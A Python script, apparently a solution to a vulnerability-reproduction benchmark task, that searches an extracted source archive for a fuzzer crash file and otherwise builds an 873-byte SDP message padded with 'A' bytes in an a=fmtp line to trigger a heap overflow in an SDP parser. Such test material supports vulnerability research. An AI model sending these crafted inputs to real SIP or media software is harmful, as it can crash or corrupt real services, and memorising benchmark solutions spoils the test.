import os
import tarfile
import tempfile
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    self._safe_extract(tar, tmpdir)
            except Exception:
                return self._fallback_poc()

            poc = self._find_poc(tmpdir)
            if poc is not None and len(poc) > 0:
                return poc
            return self._fallback_poc()
        except Exception:
            return self._fallback_poc()

    def _is_within_directory(self, directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        return os.path.commonpath([abs_directory, abs_target]) == abs_directory

    def _safe_extract(self, tar: tarfile.TarFile, path: str) -> None:
        for member in tar.getmembers():
            member_path = os.path.join(path, member.name)
            if not self._is_within_directory(path, member_path):
                continue
            try:
                tar.extract(member, path)
            except Exception:
                continue

    def _find_poc(self, root: str) -> bytes | None:
        target_len = 873
        interesting_keywords = (
            "376100377",
            "sdp",
            "oss-fuzz",
            "clusterfuzz",
            "poc",
            "crash",
            "heap",
            "overflow",
            "fuzz",
            "corpus",
            "repro",
            "testcase",
        )
        strong_keywords = ("376100377", "clusterfuzz", "oss-fuzz")
        skip_ext_penalize = {
            ".c",
            ".h",
            ".cpp",
            ".cc",
            ".cxx",
            ".hpp",
            ".hh",
            ".java",
            ".py",
            ".sh",
            ".bash",
            ".zsh",
            ".ps1",
            ".bat",
            ".md",
            ".rst",
            ".html",
            ".xml",
            ".json",
            ".yaml",
            ".yml",
            ".toml",
            ".ini",
            ".cfg",
            ".cmake",
            ".am",
            ".ac",
            ".m4",
            ".in",
            ".mak",
            ".mk",
        }

        best_score = None
        best_path = None
        best_diff = None

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                try:
                    st = os.stat(full)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue

                size = st.st_size
                if size == 0 or size > 1_000_000:
                    continue

                rel = os.path.relpath(full, root)
                lower = rel.lower()
                name_lower = fn.lower()
                ext = os.path.splitext(fn)[1].lower()

                has_kw = any(k in lower for k in interesting_keywords)

                if (not has_kw) and (size != target_len) and (ext != ".sdp"):
                    continue

                score = 0

                if size == target_len:
                    score += 600
                diff = abs(size - target_len)
                score += max(0, 300 - diff)

                if any(k in lower for k in strong_keywords):
                    score += 500
                if "sdp" in lower:
                    score += 120
                if "fuzz" in lower or "corpus" in lower or "seed" in lower:
                    score += 80
                if "poc" in lower or "crash" in lower or "repro" in lower or "testcase" in lower:
                    score += 100
                if ext == ".sdp":
                    score += 150
                if ext in skip_ext_penalize:
                    score -= 120
                if ext in (".a", ".o", ".so", ".dylib", ".dll", ".exe"):
                    score -= 500

                head = b""
                try:
                    with open(full, "rb") as f:
                        head = f.read(256)
                except OSError:
                    pass

                if head:
                    hlow = head.lower()
                    if (
                        b"v=0" in hlow
                        or b"o=" in hlow
                        or b"s=" in hlow
                        or b"a=" in hlow
                        or b"c=" in hlow
                        or b"m=" in hlow
                    ):
                        score += 200
                    if b"rtpmap" in hlow or b"fmtp" in hlow:
                        score += 80
                    if b"sip" in hlow or b"webrtc" in hlow:
                        score += 50

                if best_score is None or score > best_score or (score == best_score and diff < (best_diff or diff + 1)):
                    best_score = score
                    best_path = full
                    best_diff = diff

        if best_path is not None and best_score is not None and best_score > 0:
            try:
                with open(best_path, "rb") as f:
                    return f.read()
            except OSError:
                return None
        return None

    def _fallback_poc(self) -> bytes:
        header = (
            b"v=0\r\n"
            b"o=- 0 0 IN IP4 127.0.0.1\r\n"
            b"s=PoC SDP\r\n"
            b"c=IN IP4 127.0.0.1\r\n"
            b"t=0 0\r\n"
            b"m=audio 49170 RTP/AVP 0\r\n"
            b"a=rtpmap:0 PCMU/8000\r\n"
            b"a=fmtp:0 "
        )
        tail = b"\r\n"
        target_len = 873
        body_len = max(0, target_len - len(header) - len(tail))
        body = b"A" * body_len
        return header + body + tail